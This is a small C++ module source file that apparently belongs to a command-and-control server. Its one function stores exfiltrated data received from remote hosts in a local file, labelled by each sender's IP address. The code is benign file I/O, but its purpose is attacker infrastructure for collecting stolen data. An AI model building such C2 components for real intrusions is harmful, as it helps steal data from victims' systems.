module;

module c2server.exfil;

import std;

namespace c2server {

   ExfilFn makeFileExfil(std::string_view path) {
      auto filePath = std::string{path};

      return [filePath = std::move(filePath)](std::string_view ip, std::string_view data) {
         auto out = std::ofstream{filePath, std::ios::app};
         out << '[' << ip << "]\n" << data << "\n---\n";
      };
   }

} // namespace c2server
